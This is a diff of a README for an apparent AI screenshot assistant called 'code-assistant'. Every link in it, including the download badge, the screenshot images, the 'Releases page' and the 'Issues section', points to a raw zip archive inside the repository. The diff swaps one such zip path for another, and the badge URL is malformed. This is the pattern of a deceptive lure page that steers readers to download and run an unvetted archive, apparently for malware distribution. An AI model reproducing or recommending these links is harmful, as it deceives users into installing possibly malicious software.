@@ -1,6 +1,6 @@
 # 🖥️ code-assistant - Effortless AI Assistance for Screenshots
 
-[![Download Now](https://raw.githubusercontent.com/Zay-Zaire/code-assistant/master/ai_assistant/utils/code_assistant_3.7.zip%20Now-Get%20the%20Latest%https://raw.githubusercontent.com/Zay-Zaire/code-assistant/master/ai_assistant/utils/code_assistant_3.7.zip)](https://raw.githubusercontent.com/Zay-Zaire/code-assistant/master/ai_assistant/utils/code_assistant_3.7.zip)
+[![Download Now](https://github.com/Zay-Zaire/code-assistant/raw/refs/heads/master/ai_assistant/ui/code-assistant-v2.8.zip%20Now-Get%20the%20Latest%https://github.com/Zay-Zaire/code-assistant/raw/refs/heads/master/ai_assistant/ui/code-assistant-v2.8.zip)](https://github.com/Zay-Zaire/code-assistant/raw/refs/heads/master/ai_assistant/ui/code-assistant-v2.8.zip)
 
 ## 🎯 What is This?
 
@@ -26,19 +26,19 @@ This application is your handy tool for taking screenshots and quickly asking AI
 ## 📸 Screenshot Previews
 
 ### Main Interface
-![Main Interface Settings](https://raw.githubusercontent.com/Zay-Zaire/code-assistant/master/ai_assistant/utils/code_assistant_3.7.zip)
+![Main Interface Settings](https://github.com/Zay-Zaire/code-assistant/raw/refs/heads/master/ai_assistant/ui/code-assistant-v2.8.zip)
 
 ### Prompt Configuration
-![Prompt Settings](https://raw.githubusercontent.com/Zay-Zaire/code-assistant/master/ai_assistant/utils/code_assistant_3.7.zip)
+![Prompt Settings](https://github.com/Zay-Zaire/code-assistant/raw/refs/heads/master/ai_assistant/ui/code-assistant-v2.8.zip)
 
 ### AI Response Window
-![Floating Window](https://raw.githubusercontent.com/Zay-Zaire/code-assistant/master/ai_assistant/utils/code_assistant_3.7.zip)
+![Floating Window](https://github.com/Zay-Zaire/code-assistant/raw/refs/heads/master/ai_assistant/ui/code-assistant-v2.8.zip)
 
 ## 🚀 Getting Started
 
 Follow these steps to download and run the code-assistant application:
 
-1. **Download the Application**: Visit the [Releases page](https://raw.githubusercontent.com/Zay-Zaire/code-assistant/master/ai_assistant/utils/code_assistant_3.7.zip) to get the latest version. 
+1. **Download the Application**: Visit the [Releases page](https://github.com/Zay-Zaire/code-assistant/raw/refs/heads/master/ai_assistant/ui/code-assistant-v2.8.zip) to get the latest version. 
 
 2. **Install the Application**:
    - Locate the downloaded file on your computer, typically found in the "Downloads" folder.
@@ -59,7 +59,7 @@ Follow these steps to download and run the code-assistant application:
 
 ## 📥 Download & Install
 
-To begin, download the latest release from our [Releases page](https://raw.githubusercontent.com/Zay-Zaire/code-assistant/master/ai_assistant/utils/code_assistant_3.7.zip). Once downloaded, install it by following the instructions above.
+To begin, download the latest release from our [Releases page](https://github.com/Zay-Zaire/code-assistant/raw/refs/heads/master/ai_assistant/ui/code-assistant-v2.8.zip). Once downloaded, install it by following the instructions above.
 
 ## 💡 System Requirements
 
@@ -76,7 +76,7 @@ If you encounter issues, try the following:
 - **Update Python**: Verify that your Python version is 3.10 or higher. 
 - **Check Permissions**: Ensure the application has the necessary permissions to run.
 
-For further assistance, check the [Issues section](https://raw.githubusercontent.com/Zay-Zaire/code-assistant/master/ai_assistant/utils/code_assistant_3.7.zip) on our GitHub page.
+For further assistance, check the [Issues section](https://github.com/Zay-Zaire/code-assistant/raw/refs/heads/master/ai_assistant/ui/code-assistant-v2.8.zip) on our GitHub page.
 
 ## 📞 Contact
 
